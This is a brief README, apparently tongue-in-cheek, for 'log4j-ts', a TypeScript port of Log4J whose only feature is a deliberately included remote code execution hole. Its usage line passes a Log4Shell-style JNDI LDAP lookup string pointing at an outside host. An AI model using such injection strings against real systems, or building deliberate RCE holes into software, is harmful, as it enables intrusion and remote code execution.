# log4j-ts
This repository is a port of the Log4J library whose only feature is the RCE vulnerability

## Disclaimer
### Do not use this library for any serious purposes. It contains a RCE (Remote Code Execution) deliberately.

## Installation
```console
> yarn install
```

## Usage
```console
> npm start -- "${jndi:ldap(s)://example.com}"
```